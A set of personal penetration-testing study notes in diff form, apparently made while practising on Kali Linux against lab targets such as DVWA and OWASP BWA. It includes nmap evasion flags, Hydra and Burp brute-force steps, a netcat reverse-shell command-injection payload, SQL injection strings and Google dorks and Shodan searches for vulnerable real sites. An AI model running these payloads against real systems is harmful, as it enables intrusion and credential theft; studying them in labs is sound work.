@@ -1,0 +1,558 @@
+HOW DO I CREATE A BOOTABLE KALI DRIVE?
+1.	Download Rufus from rufu.ie 
+a.	This program can ONLY be downloaded from a Windows computer
+2.	Download Kali Linux from kalilinux.org
+a.	Make sure it is the 64-bit
+3.	Plug in USB
+a.	I used a 16gb flashdribe
+4.	Open rufus and download onto drive
+a.	Make sure to make the bootable image an ISO 
+i.	Sometimes on kali it won’t show up, if this happens copy and paste the file location
+b.	Partition 
+i.	I would split it in half 
+5.	Boot
+a.	Plug in flashdrive and the power one computer
+b.	WHILE powering on press button the goes to boot screen (on librehm15 it is ESC)
+c.	Select the USB drive
+6.	Boot Kali Live Persistence (Encrypted)
+7.	It will ask you to enter a password and then load Kali Live
+a.	If you open files you will notice the Kali drive along with persistence, you should save all files into the persistence file
+
+HOW DO SETUP KALI?
+1.	Update/Upgrade
+2.	Install Tor
+
+HOW DO I UPDATE/UPGRADE KALI?
+1.	Run apt update to check for updates
+i.	This will tell you how many have been updated, how many need to be updated and how many need to be removed
+2.	Run apt upgrade to upgrade all the programs that need to be upgraded 
+i.	This may take a while
+3.	Run apt dist-upgrade to upgrade packages that were not upgraded in the previous upgrade
+4.	Run apt update again and may see packages that are no longer needed, to remove the packages that are not needed run apt autoremove
+
+HOW DO I INSTALL TILIX?
+1.	Open firefox
+2.	Open google search engine
+3.	Search for tilix github
+4.	After opening link click on clone or download
+5.	Copy the link shown
+6.	Now open terminal
+7.	Run git clone [paste link]
+
+
+HOW DO I INSTALL TOR?
+
+1.	Open terminal
+2.	Run apt-get install tor
+3.	Run service tor start to open browser
+
+HOW DO I CHANGE MY IP ADDRESS AND WIRELESS ADAPTER SETUP?
+
+1.	Run ipconfig so see what the IP address is
+2.	Go into kali setting and open the network setting and change to Bridged Adapter and make sure cable connected is checked
+3.	If you run ipconfig again is should show it is connected to locale network
+
+
+HOW DO I CHANGE MY MAC ADDRESS?
+
+1.	run ipconfig to check for network interface 
+2.	run macchanger -s [network interface] to see current and permanent MAC address
+3.	run macchanger -r [network interface] will change MAC address to a random one
+4.	run macchanger –mac=[new mac address] [network interface] to change mac address to a spefic address 
+5.	run macchanger -p [network interface] to change back to original addresses
+
+HOW CAN I HACK THROUGH GOOGLE?
+
+1.	Open Firefox and go to google.com
+2.	type ¬inurl: “index.php? id=” to search for links with that ending of url only
+a.	these websites can be vulnerable to user input
+3.	search google hacking database and click on first link
+a.	if you copy and paste links from the website into google seach engine it will show all websites with information pertaining to the link
+
+HOW DO I GET INFORMATION FROM A WEBSITE?
+
+1.	Open terminal
+2.	Run whois [website] for information on the website
+3.	Run whois [website] > result.txt and it will save all the information onto a file
+
+HOW TO USE EMAIL HARVESTER?
+
+1.	Run locate theHarvester to find out which directory it is stored under
+2.	Go to that directory
+3.	Run theHarvester (in green letter)
+a.	Sometimes runs and sometimes doesn’t
+
+HOW DO I USE SHODAN?
+
+1.	Open firefox and search shodan
+2.	If you search default password it will show addresses that have default passwords
+3.	If you click on IP address it will show you more information
+4.	Then copy IP address and paste onto address bar 
+5.	You can also copy and paste your own IP address into shodan search bar 
+a.	If it shows anything then your computer may be vulnerable
+
+HOW DO I FIGURE OUT MY ROUTERS IP ADDRESS?
+1.	Open terminal
+2.	Run netstat -nr
+3.	Address under Gateway is the router IP address
+
+HOW DO I USE DIG?
+
+1.	Run dig [website url]
+a.	This will show information about the website
+b.	A is the IPv4 address and AAAA is the IPv6 address
+2.	Run dig axfr [website url] [other server] for zone transfer
+
+HOW DO I USE DSNSENUM?
+
+1.	Run dsnsenum [web url] to show the IPv4 of URL
+a.	May take a while
+
+HOW TO MAKE A NEW USER ON KALI?
+ 
+1.	Run useradd -m [username]
+2.	Then to set a password run passwd [username]
+3.	Now add the new suer to the sudoers group to be able to use administrative actions 
+a.	Run usermod -a -G sudo [username]
+4.	Lastly specify the shell for the new user by running chsh -s /bin/bash [username]
+
+HOW DO I INSTALL METASPLOITABLE?
+
+1.	Open google search engine and search for metasploitable
+2.	Download it
+a.	Not all websites require you to make and account
+3.	Extract file since it is a zip file
+4.	When you open the folder there should be 5 files, use the file that has an icon to the left
+5.	Create new virtual machine and choose other linux
+a.	Memory size should be at least 512mb
+6.	Make sure to choose use an existing virtual hard disk
+a.	Then choose the metasploitable
+HOW DO I USE METASPLOITABLE?
+
+1.	Start from virtual machine
+2.	Type in username = msfadmin type in password = msfadmin
+3.	Will just be a command line 
+
+HOW DO I USE NMAP?
+
+1.	Open terminal
+2.	Type nmap for info
+3.	Type nslookup [ip address] for name 
+4.	Type nslookup [website name] for ip address
+
+HOW DO I USE CURL?
+
+1.	Run curl ipinfo.io/[ipaddress] for info
+
+HOW DO I FIND THE LOCATION OF AN IP ADDRESS?
+
+1.	Google an ip location site 
+
+HOW TO I PRACTICE SCANNING WITH NMAP LEGALLY?
+
+1.	Type in internet URL scanme.nmap.org
+2.	Run in terminal nmap -v -A scanme.nmap.org 
+a.	Filtered ports could be protected by firewall
+
+3.	Run nmap scanme.nmap.org >> results.txt to save the results
+
+HOW DO I PRACTICE SCANNING MY OWN MACHINE?
+
+1.	Run nmap [ip address or website]  to scan ports
+2.	Run nmap -p [1-number of ports] [ip address or website] to scan all ports
+a.	Will take a while
+
+HOW TO I SCAN MY LOCAL NETWORK?
+
+1.	Run nmap -vv [ip address]-[number of hosts] -F
+
+HOW DO I FIND OUT THE OPERATING SYSTEM USING IP ADDRESS?
+	
+1.	Run nmap -o [ip address or site name] 
+a.	Can be wrong sometimes
+b.	If not in local network it can take a while
+2.	Run nmap -sV -v [ip address or website] to get list of things running on open ports
+
+HOW TO USE ZENMAP?
+
+1.	Click on the down arrow of the application tab on the upper left corner of kali
+2.	Go under information gathering and zenmap will be on the bottom
+3.	Open nmap
+4.	Enter the IP address in the target tab
+5.	Click the down arrow of profile to change the type of scan
+6.	Add -v to command tab to see while its scanning
+7.	Add -o to command to find operating system
+
+HOW TO USE NMAP COMMANDS?
+
+1.	-Pn command
+a.	Sometimes nmap will lie and tell you host is down
+b.	This command will run nmap without host discovery and will look for ports
+c.	Run nmap -Pn [ip address] 
+2.	-sT command
+a.	Performs a three-way handshake
+b.	Sends target computer sin and target computer sends back sin-ack
+c.	Run nmap -sT [ip address]
+i.	It is very detectable 
+ii.	May take a while
+iii.	Will give accurate and precise results
+3.	-sS command
+a.	Only the first part of the -sT command
+b.	Only be sending first part of the three-way handshake
+c.	Can use this to avoid target from detecting scan
+d.	Run nmap -sS [ip address]
+i.	May take longer than -sT scan
+ii.	Can be detected by IPS
+iii.	Will give same output as -sT scan
+4.	-sU command
+a.	A UDP scan
+b.	May not be a reliable
+c.	Run nmap -sU [ip address]
+i.	A slower scan
+ii.	Will show open UDP ports
+
+HOW CAN I AVOID DEFENSES USING NMAP?
+	
+1.	Try -sA option
+a.	Stands for -ack which is the last part of the 3 way TCP handshake
+b.	Can be used to bypass some rules of routers
+c.	Many computers can detect the sin(first part of TCP handshake) packets being sent, so to avoid this you can just send the ack(last part of TCP handshake) which can trick the computer
+d.	Usually computers will only accept sin packets from their local network, so as an outside computer it will likely not let you send a sin packet but will allow you to send an ack packet
+e.	Run nmap -sA [ip address]
+2.	Choose the port to send packages from
+a.	Nmap usually specifies port randomly which can be a problem if the target only allows packets coming from a specific port
+b.	Run nmap --source-port [number of source port] [ip address]
+i.	Use when target is only allowing packets to come from specific port
+3.	Bypass nmap size detection
+a.	Sometimes computers will know about nmap and specify to block any packats the size of nmap packets
+b.	To bypass this you can run nmap --data-length [length] [ip address]
+4.	Spoofing mac address with nmap
+a.	Run macchanger --show eth0 to show mac address
+b.	Run nmap --spoof-mac [new desired mac address] [ip address of target]
+
+HOW TO USE PRE-INSTALLED SCRIPS IN NMAP?
+
+1.	To get to scripts 
+a.	Open terminal and run cd /usr/share/nmap/
+b.	Run ls
+c.	Open sub directory scripts cd scripts/
+i.	Type ls to shows all pre=installed nmap scripts
+d.	Run nmap [ip address] to find open ports
+i.	As long as 22/tcp port is open you can run this scan
+e.	Run ls | grep ssh
+i.	Will show you files with ssh
+f.	Run nmap --script=[name of script] [ip address]
+i.	You can use brute force script for passwords
+
+HOW TO DOWNLOAD AND USE VULSCAN AND NMAP-VULNERS ON NMAP?
+
+1.	Go nmap scripts directory by running cd /usr/share/nmap/scripts/
+2.	Open firefox and type in search engine type vulscan github	
+a.	Click on first link which will take you to the github repository
+b.	Go back to terminal and run git clone [link].git
+c.	Vulscan will then be seen as a directory 
+3.	Go back to firefox and search nmap-vulners github
+a.	Click first link
+b.	Copy and paste into terminal using command git clone [link].git
+4.	Make directory by running mkdir nmapscripts then move both directories into that directories
+5.	Go to nmap scripts directory and run nmap --script vulscan,nmap-vulners -sV [ip address of target] to discover vulnerabilities
+a.	No finding means it did not find vulnerabilities on that port
+b.	Higher number means more vulnerable
+c.	Copy and paste link with vulnerability into firefox search engine and it will give more information on the vulnerability
+d.	To exploit the vulnerability copy and paste the name of the vulnerability into search engine and see if anyone wrote any exploit for it
+e.	Can also try searching the name of the vulnerability itself followed by exploit
+i.	Look for program that exploits the vulnerability 
+1.	Run the file and it will exploit the vulnerability
+
+HOW DO I INSTALL OWASP?
+
+*OWASP is an intentionally vulnerable vritual machine that you can use for testing
+1.	Open Firefox and search for OWASPbwa and click on the link
+a.	Download from sourceforge
+2.	Download file (will be a zip file)
+a.	Extract the file
+b.	Use only first .vmdk file
+3.	Open VM and open new virtual machine and name it
+4.	Pick linux and ubuntu 64bit
+a.	Leave on 512 mb
+5.	Use exiting virtual hard disk and open extracted folder and pick the first .vmdk file
+6.	Click create and then VM should be ready
+7.	Click start and it will finish process of installation 
+a.	Username: root 
+b.	Password: owaspbwa
+8.	Run ipconfig to configure ip address to local network
+9.	Close settings of virtual machine and go to setting
+a.	Go to network and under adapter 1 make attached to bridge adapter
+b.	Under advanced and make sure cable connected
+10.	Open VM again
+11.	Enter username/password
+12.	Now it’s ready for hacking!
+
+HOW TO USE NMAP SCRIPTS WITH HTTP?
+
+1.	Run cd /usr/share/nmap/scripts/
+2.	Then run ls | grep method
+a.	Script your looking for is http-methods.nse
+3.	Run nmap --script=http-methods.nse -p 80,443,8080 [ip address of target]
+a.	Will tell you available methods and its risk
+
+HOW DO I CONFIGURE BURPSUITE?
+
+1.	Open applications on top left and should be the first on the list
+2.	Open burpsuite
+3.	Click use burp as defaults and start
+4.	Go into the proxy setting and click on the interface and click edit
+5.	Set bind to port 8080 and bind to address lockpad only
+6.	The go to firefox and go to the preferences
+7.	Go to general and scroll down to network proxy
+8.	Click settings and set to manual proxy configuration
+9.	Set all proxys to ip address of local host and to port 8080
+10.	Check SOCKS v5
+11.	Go to burpsuite and turn intercept off
+12.	Then go to firefox and open new tab and search htt//burp and download and save certificate
+13.	Go to firefox privacy and security settings
+14.	Go to view certificates 
+15.	Import the certificate you just downloaded
+
+HOW DO I INTERCEPT AND VIEW PACKETS ON BURPSUITE?
+
+1.	Open terminal and type in burpsuite to run program
+a.	May cause internet to slow down a little
+2.	Check temporary project and click next then start
+3.	Open firefox and search website
+a.	Website will keep loading until you forward packets from burpcuite
+4.	In burpsuite go under http history to see requests and responses
+a.	Under responses you can also see cookies and when they expire
+5.	Under response then raw you can see information and the html code
+6.	You can also change the html code and it will change what is happening on the website
+
+HOW DO I USE WHATWEB AND DIRB?
+
+1.	Open terminal and enter whatweb for more info 
+2.	Run whatweb -v [ip address] to see things running on the website and more info about website
+3.	type dirb in terminal for available options
+a.	dirb scans for directories and extensions from webpage
+4.	run /usr/share/wordlist/dirb 
+5.	run dirb http://[ip address] [directory of word list]
+a.	ex dirb http://129.168.1.9 /usr/share/wordlists/dirb/common.txt
+b.	the pages it shows you can be links to websites with username password info
+i.	run the websites in firefox to check
+
+HOW DO I DO A PASSWORD RECOVERY ATTACK?
+
+1.	Set up burpsuite as proxy and turn intercepter off
+2.	To scan page actively => right click on directory in burpsuite and click to spider actively 
+
+EXAMPLE
+1.	Go to OWASPpwa and click on OWASP Web Goat
+a.	The user and password is webgoat
+i.	Don’t save password
+b.	Click start WebGoat
+c.	Go to forgot password link
+d.	Go to burpsuite and turn intercept on
+e.	Go back to page and try a username
+f.	Go back to burpsuite and look for post request packet
+i.	Send packet to intruder by right clicking and pressing link
+ii.	Go to the intruder tab
+1.	Positions
+iii.	You will now see your packet
+iv.	Select snipper attack type
+v.	Just select the username
+vi.	Then go to payloads tab
+1.	Click load and look for wordlists and click on Metasploit
+2.	Find http_default_users.htp
+3.	Click start attack and press ok
+4.	Look for username with a different length
+5.	That username should work
+
+HOW DO I BRUTEFORCE A LOGIN?
+
+1.	Open Owaspbwa and make sure proxy is set up in firefox
+2.	Go to the OWASP webpage and click on OWASP Bricks
+3.	Go into the bricks and login page tabs
+4.	Go to login #3
+5.	Open terminal and enter nano users.txt and add the following
+a.	Admin webgoat
+b.	Administrator
+c.	User
+d.	Test
+e.	Admin
+f.	Testuser
+g.	Then controlx to exit
+6.	Now run nano passwords.txt and add the following
+a.	123456
+b.	password
+c.	Password1
+d.	admin
+e.	webgoat
+f.	Webgoat
+g.	qwerty
+h.	123123
+i.	12345678
+j.	owasp
+7.	go back to burpsuite and turn interface on
+8.	go back to login page and type anything and submit
+9.	then turn interface back on
+10.	on burpsuite for to target > site map > then look for the login packet (post request)
+11.	send the packet to the intruder
+12.	select the username and press add, then select the password entered and press add
+13.	Type of attack should be cluster bomb 
+a.	this is used to bruteforce two different inputs
+14.	set payloads to 1 and then press load 
+a.	find the username and password list you created earlier
+b.	first open the user.txt 
+c.	the go back to payload set and select 2
+d.	load passwords.txt
+15.	in the Grep - Match section and clear all the strings
+16.	in the add section type, Wrong user name or password. 
+17.	then click Start Attack and press ok
+18.	look for response that is not checked next to wrong
+19.	for real attacks you want to use much bigger lists
+
+HOW DO I USE HYDRA?(ex)
+
+1.	open terminal and type hydra to see different options
+2.	open OWASP website and go to OWASP bricks
+3.	open burpsuite and turn intercept on
+4.	go back to bricks and put anything for username/password
+5.	in burpsuite copy the post page path 
+6.	then turn intercept off
+7.	go to terminal again and run hydra [ip address] http-form-post “[path]:username=^USER^&passwd=^PASS^&submit=submit:Wrong user name or password.” -L users.txt -P passwords.txt
+a.	This uses the username and password list previously created
+
+HOW TO ATTACK USING SESSION FIXATION?
+
+1.	Open burpsuite
+2.	open OWASP webgoat
+a.	go to session management
+i.	high jack a session
+3.	Turn intercept on in burpsuite
+4.	type anything in username/password in OWASP
+5.	Turn intercept off
+6.	go on burpsuire and under target look for the packet with the post request with the username/password
+a.	right click on packet and send it to sequencer
+b.	click on start live capture
+1.	Go back to OWASP web goat and click on session fixation
+a.	this will show an example of an email to hack another account without knowing username/password
+2.	Type a session id into the email and make sure the url is the same in the link as it is in the email
+3.	turn the intercept off in burpsuite
+4.	this will complete stage one of the attack 
+a.	this will send email looking legit but really allowing hacker to enter session
+
+HOW TO COMPLETE A SIMPLE COMMAND INJECTION?
+
+1.	Turn on burpsuite and open terminal and open OWASP VM
+a.	in the OWASP VM run ifconfig to find out ip address
+b.	then copy and paste that address into firefox for the OWASP website
+2.	On the OWASP website click on Damn Vulnerable Web Application
+3.	Attack with hydra to find out username and website
+a.	in terminal run hydra [ip address] http-form-post “[link path]:username=^USER^&password=^PASS^&Login=submit:Login failes” -L users.txt -P passwords.txt
+b.	Then you have the username and password	
+4.	Enter username and password into the website
+5.	Once logged in go click on the command execution section
+a.	Enter an ip address and click submit to show PING results 
+b.	enter [ip address];whoami to execute command
+i.	will show users on that servers
+ii.	also shows that this server is vulnerable to command injections
+
+HOW DO I GAIN ACCESS TO A MACHINE USING A COMMAND INJECTION?
+
+1.	Complete steps 1+2 on the HOW TO COMPLETE A SIMPLE COMMAND INJECTION
+2.	In firefox DVWA enter [ip address]:uname -a
+a.	this will give the version of the operating system and information on the macine
+3.	Use netcat to connect to another PC
+a.	open terminal and type nc -lvp [port #]
+4.	open firefox and type ip address of kali linux machine [ip address of owasp];nc.traditional -e /bin/bash/ [kali ip address] [port]
+5.	if you open terminal it will show the connection
+a.	type command whoami
+b.	then type uname -a
+c.	you can search ls and search files and other stuff and check for computer information on the machine being attacked
+
+HOW DO I PERFORM A BLIND COMMAND INJECTION?
+
+1.	Complete steps 1 and 2 from HOW TO COMPLETE A SIMPLE COMMAND
+2.	In firefox DVWA click on connect execution and enter ip address
+3.	to see if it is vulnerable to blind execution ping two ip addresses 
+a.	this would be the ip address of the router and the ip address of the kali linux machine
+b.	format [ip address]:ping [ip address of kali machine] -c [amount of packets you want pinged]
+4.	in terminal run wireshark
+a.	click on the packet for eth0
+5.	open terminal again and ping ip address
+a.	packets will then show on wireshark
+6.	go back to firefox and submit ping from step 3B
+7.	go back to wireshark to see if someone has pinged you
+a.	look for pinged requsts on the correct ip address
+
+HOW DO I USE SHELLSHOCK FOR COMMAND INJECTIONS?
+
+1.	In the terminal run msfconsole
+2.	the run use exploit/multi/http/apache_mod_cgi_bash_env_exec
+3.	then run show options
+a.	this will show the options that you can use to use this vulnerability
+
+HOW TO USE SQL INJECTIONS?
+
+-	Can use to get user info, passwords, and interact with databases
+
+1.	Some commands to know
+a.	CREATE
+i.	create a database
+b.	SELECT
+i.	to select a specific column or row or something
+ii.	most oftenly used
+iii.	for example, SELECT elements FROM table WHERE condition
+iv.	another example, SELECT name, description, price FROM products WHERE price<599
+v.	for example, SELECT columnA FROM tableX WHERE columnE = ‘employee’ AND column=100;
+c.	UPDATE
+i.	update the database
+d.	INSERT	
+i.	insert a new element into the database
+e.	DELETE
+i.	will delete a certain part of the database
+f.	DROP
+i.	deletes the entire database
+2.	Open firefox and go n the OWASP website click on Damn Vulnerable Web Application
+a.	go to the SQL injection section
+b.	to view source code click on view source code
+3.	Type a number into the the User ID section and it will give you the first name and surname for that specific user ID
+a.	EX. if type 1 then it will show admin
+i.	if type 2 it should show Gordon Brown
+b.	if you type a user ID and nothing shows up then it does not have a user
+4.	Usually to check SQL injection type a single apostrophe (‘) and click submit
+a.	if server is vulnerable then it will print an error
+5.	Run in the DVWA website 2’ ORDER BY 1 #’ to find the number of columns
+a.	order by 1 means there is one column and to check if there is another you run order by 2 and keep going until it does not say anything which means there are no more columns
+6.	Run command 2’ UNION 1,2#’ to find the order of the columns
+7.	Run command 2’ UNION SELECT database(),user() #’ to find name of users and database
+8.	Run 2’ UNION SELECT schema_name,2 FROM information_schema.schemata #’ to find all configurations and information from the database 
+9.	Run 2’ UNION SELECT table_name, FROM information_schema.tables WHERE table_schema = ‘dvwa’ #’ to find out how many tables and the information in the tables
+a.	you can then target a specific table and, for instance, find out how many columns there are in that table
+i.	Run 2’ UNION SELECT column_name_type FROM information_schema.columns WHERE table_schema = ‘dvwa’ AND table_name = ‘users’ #’
+b.	to specify username, password and user ID list you can then run 2’ UNION SELECT  CONCAT(user_id,’-‘,first_name,’ ‘,last_name), CONCAT(user,’:’,password) FROM dvwa.users #’
+10.	Open a new tab in Google and search md5 decrypter to decrypt hash encryptions
+a.	Paste the hash and it will decrypt it and it will show the password for the hash
+
+HOW DO I USE A BLIND SQL INJECTION?
+
+1.	Follow steps 1 & 2 and HOW DO I COMPLETE A SIMPLE COMMAND INJECTION?
+2.	Click on the link for SQL Injection (Blind)
+3.	Run 1’ AND database() = ‘dvwa’ to bruteforce the database, statement has to be true for output to be printed
+a.	if there is no output then it is wrong
+4.	IF you do not know the name of the database you can run 1’ AND database() = ‘d
+a.	then go to burpsuite and turn intercept on
+i.	Then you would send the packet to the intruder (right click on packet) 
+ii.	then check for the letter that gives a deifferent length in the response-- this will be the first letter of the name of the database
+iii.	Choose the letter with the different length and bruteforce it with all of the letters in the alphabet
+1.	create password list with all the letters of the alphabet and use that
+b.	continue this step with users, columns, ect
+i.	this takes a lot longer than the regular SQL injection
+
+HOW DO I USE THE SQL MAP?
+
+1.	sql map comes pre-installed in kali so first open the terminal and run sqlmap --help to see available options
+2.	Open firefox and go to the OWASP page and click on OWASP Multitude II
+a.	make sure burpsuite is open 
+3.	On the OWASP page go to OWASP 2007, then Improper Error Handling, then User Info (SQL)
+4.	Enter anything for the username/password and then click View Account Details
+5.	Copy the URL link and go back to terminal and run sqlmap -u “[paste link]” -p username --schema
+a.	for questions answer [Y, Y]
